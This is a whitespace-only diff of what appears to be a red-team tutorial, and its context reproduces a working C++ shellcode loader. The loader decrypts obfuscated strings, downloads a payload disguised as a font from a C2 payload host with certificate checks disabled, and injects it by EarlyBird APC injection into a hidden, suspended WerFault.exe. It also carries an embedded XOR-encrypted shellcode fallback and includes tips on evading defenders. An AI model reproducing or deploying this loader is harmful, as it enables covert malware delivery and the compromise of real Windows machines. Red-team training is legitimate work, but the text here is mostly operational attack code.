@@ -110,7 +110,7 @@ sudo certbot --nginx -d www.example-business.com -d api.example-business.com -d 
 
 This gives us legitimate SSL certificates from Let's Encrypt for:
 - `www.example-business.com` - Our decoy WordPress site
-- `api.example-business.com` - C2 communications endpoint  
+- `api.example-business.com` - C2 communications endpoint
 - `dl.example-business.com` - Payload hosting endpoint
 
 ### Creating the WordPress Decoy
@@ -368,7 +368,7 @@ Let me walk through the actual loader code and explain exactly how it works. Thi
 #define LOG_WARNING(msg) std::cout << "[!] " << msg << std::endl
 ```
 
-The includes and pragmas set up everything we need. Windows.h gives us the core Windows API functions for process manipulation, while winternl.h provides access to internal Windows structures and undocumented APIs that aren't in the standard headers. 
+The includes and pragmas set up everything we need. Windows.h gives us the core Windows API functions for process manipulation, while winternl.h provides access to internal Windows structures and undocumented APIs that aren't in the standard headers.
 
 We need winhttp.h for HTTP client functionality to download our payloads, and TlHelp32.h for process enumeration and manipulation. The ktmw32.h header is for Kernel Transaction Manager operations, though we don't use those features in this particular loader.
 
@@ -419,7 +419,7 @@ struct ObfuscatedString {
             data[i] = str[i] ^ XOR_KEY;
         }
     }
-    
+
     std::string decrypt() const {
         std::string result;
         for (int i = 0; i < N - 1; i++) {
@@ -445,7 +445,7 @@ class AdvancedPayloadLoader {
 private:
     std::vector<BYTE> payload;
     std::mt19937 rng;
-    
+
     // Simplified stealth configuration
     struct StealthConfig {
         bool useJitteredSleep = true;
@@ -481,23 +481,23 @@ The EarlyBird injection is the core technique that makes this loader effective a
     // Early Bird APC Queue Injection
     bool EarlyBirdInjection(const std::wstring& targetPath) {
         LOG("Starting EarlyBird injection on " + std::string(targetPath.begin(), targetPath.end()));
-        
+
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = {};
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
-        
+
         if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
             LOG_ERROR("Failed to create suspended process");
             return false;
         }
-        
+
         LOG("Created suspended process (PID: " + std::to_string(pi.dwProcessId) + ")");
 
         LPVOID pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payload.size(),
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        
+
         if (!pRemoteMemory) {
             LOG_ERROR("Failed to allocate memory");
             TerminateProcess(pi.hProcess, 0);
@@ -505,7 +505,7 @@ The EarlyBird injection is the core technique that makes this loader effective a
             CloseHandle(pi.hThread);
             return false;
         }
-        
+
         SIZE_T bytesWritten;
         if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, payload.data(), payload.size(), &bytesWritten)) {
             LOG_ERROR("Failed to write memory");
@@ -517,7 +517,7 @@ The EarlyBird injection is the core technique that makes this loader effective a
         }
 
         QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, 0);
-        
+
         ResumeThread(pi.hThread);
         return true;
     }
@@ -537,31 +537,31 @@ The loader implements a sophisticated multi-tier download system with realistic 
     // Enhanced HTTPS download with full fallback system
     bool DownloadPayload() {
         LOG("Initiating payload download with 2-tier fallback system");
-        
+
         // Primary URL (your original payload server)
         std::string primaryHost = OBFSTR("dl.example-business.com");
         std::string primaryPath = OBFSTR("/assets/fonts/manrope-light.ttf");
-        
+
         // Fallback URL (Google Fonts for stealth)
         std::string fallbackHost = OBFSTR("fonts.googleapis.com");
         std::string fallbackPath = OBFSTR("/css2?family=Open+Sans:wght@300;400;600;700&display=swap");
-        
+
         // Try primary URL first
         LOG("Attempting download from primary server...");
         if (AttemptDownload(primaryHost, primaryPath)) {
             LOG("Primary download successful");
             return true;
         }
-        
+
         LOG("Primary download failed, trying fallback server...");
         JitteredSleep(2000, 4000);
-        
+
         // Try fallback URL
         if (AttemptDownload(fallbackHost, fallbackPath)) {
             LOG("Fallback download successful");
             return true;
         }
-        
+
         LOG("All download attempts failed");
         return false;
     }
@@ -580,27 +580,27 @@ Now let's look at the complete `AttemptDownload` method with all the WinHTTP set
         LOG("Initializing download from " + host);
         std::wstring wHost(host.begin(), host.end());
         std::wstring wPath(path.begin(), path.end());
-        
+
         // Rotate User-Agents for stealth
         std::vector<std::wstring> userAgents = {
             L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
             L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"
         };
-        
+
         std::uniform_int_distribution<size_t> uaDist(0, userAgents.size() - 1);
         std::wstring selectedUA = userAgents[uaDist(rng)];
-        
+
         HINTERNET hSession = WinHttpOpen(selectedUA.c_str(),
             WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
         if (!hSession) return false;
-        
+
         HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
         if (!hConnect) {
             WinHttpCloseHandle(hSession);
             return false;
         }
-        
+
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath.c_str(), NULL,
             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
         if (!hRequest) {
@@ -608,19 +608,19 @@ Now let's look at the complete `AttemptDownload` method with all the WinHTTP set
             WinHttpCloseHandle(hSession);
             return false;
         }
-        
+
         // Certificate bypass and realistic headers
         DWORD dwSecurityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA |
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecurityFlags, sizeof(dwSecurityFlags));
-        
+
         WinHttpAddRequestHeaders(hRequest, L"Accept: text/css,*/*;q=0.1", -1, WINHTTP_ADDREQ_FLAG_ADD);
         WinHttpAddRequestHeaders(hRequest, L"Accept-Language: en-US,en;q=0.9", -1, WINHTTP_ADDREQ_FLAG_ADD);
         WinHttpAddRequestHeaders(hRequest, L"Cache-Control: no-cache", -1, WINHTTP_ADDREQ_FLAG_ADD);
-        
+
         JitteredSleep(1000, 3000);
-        
+
         if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
             WinHttpCloseHandle(hRequest);
@@ -628,7 +628,7 @@ Now let's look at the complete `AttemptDownload` method with all the WinHTTP set
             WinHttpCloseHandle(hSession);
             return false;
         }
-        
+
         // Read response
         std::vector<BYTE> downloadData;
         DWORD dwSize = 0;
@@ -641,18 +641,18 @@ Now let's look at the complete `AttemptDownload` method with all the WinHTTP set
                 }
             }
         } while (dwSize > 0);
-        
+
         WinHttpCloseHandle(hRequest);
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
-        
+
         if (!downloadData.empty()) {
             LOG("Downloaded " + std::to_string(downloadData.size()) + " bytes");
             payload = downloadData; // Payload is downloaded directly over HTTPS; no additional XOR decryption is applied here.
             LOG("Payload ready (no decryption needed)");
             return true;
         }
-        
+
         return false;
     }
 ```
@@ -674,9 +674,9 @@ The **Execute** method orchestrates the complete loader workflow:
         LOG("========================================");
         LOG("  Testing EarlyBird Injection Technique against W11");
         LOG("========================================");
-        
+
         JitteredSleep(3000, 7000);
-        
+
         // Try to download payload
         bool downloadSuccess = DownloadPayload();
         if (!downloadSuccess) {
@@ -687,18 +687,18 @@ The **Execute** method orchestrates the complete loader workflow:
                 return false;
             }
         }
-        
+
         // Test EarlyBirdInjection on WerFault.exe
         std::vector<std::wstring> targets = {
             L"C:\\Windows\\System32\\WerFault.exe"  // Windows Error Reporting
         };
-        
+
         bool success = false;
-        
+
         for (const auto& target : targets) {
             std::string targetStr(target.begin(), target.end());
             LOG("Testing EarlyBirdInjection on target: " + targetStr);
-            
+
             if (EarlyBirdInjection(target)) {
                 success = true;
                 LOG("Injection succeeded on " + targetStr);
@@ -706,7 +706,7 @@ The **Execute** method orchestrates the complete loader workflow:
                 LOG_ERROR("Injection failed on " + targetStr);
             }
         }
-        
+
         return success;
     }
 ```
@@ -725,7 +725,7 @@ The GetEmbeddedPayload method provides a fallback when network access fails:
             0x21, 0x41, 0x5e, 0xe2, 0xb5, 0xfe, 0xa0, 0x48, 0x31, 0x58,
             0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4
         };
-        
+
         std::vector<BYTE> key = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };
         XorCrypt(embedded, key);
         return embedded;
@@ -750,7 +750,7 @@ public:
         //It's crucial to note that while the provided code includes console logging (via LOG and LOG_ERROR macros) for demonstration and debugging, this logging must be removed or redirected in a true operational scenario. Leaving console output active provides easy traces for defenders on a target system, severely compromising the loader's stealth.
         try {
             bool result = Execute();
-            
+
             if (result) {
                 LOG("========================================");
                 LOG("  MISSION ACCOMPLISHED!");
@@ -758,7 +758,7 @@ public:
             } else {
                 LOG_ERROR("Mission failed");
             }
-            
+
             return result ? 0 : 1;
         }
         catch (...) {
@@ -922,25 +922,25 @@ Most importantly, you now understand the **principles** behind why each componen
 
 ## References
 
-1. **Mythic C2 Framework**  
+1. **Mythic C2 Framework**
    [Mythic: A cross-platform, post-exploit, red teaming framework](https://github.com/its-a-feature/Mythic)
 
-2. **Apollo Agent for Mythic**  
+2. **Apollo Agent for Mythic**
    [Apollo - A .NET Framework 4.0 Windows Agent](https://github.com/MythicAgents/apollo)
 
-3. **HTTP C2 Profile for Mythic**  
+3. **HTTP C2 Profile for Mythic**
    [HTTP C2 Profile for Mythic Framework*](https://github.com/MythicC2Profiles/http)
 
-4. **EarlyBird Injection Technique**  
+4. **EarlyBird Injection Technique**
    [New ‘Early Bird’ Code Injection Technique Discovered*. Cyberark Security Research, 2018.](https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/)
 
-5. **Windows APC Internals**  
+5. **Windows APC Internals**
    [Asynchronous Procedure Calls*. Windows Development Documentation.](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
 
-6. **C2 Infrastructure Design Patterns**  
+6. **C2 Infrastructure Design Patterns**
    [MITRE ATT&CK Framework. Command and Control Tactics. MITRE Corporation.](https://attack.mitre.org/tactics/TA0011/)
 
-7. **WinHTTP Programming Interface**  
+7. **WinHTTP Programming Interface**
     [WinHTTP API Reference. Windows Development Documentation.](https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-start-page)
 
 ---
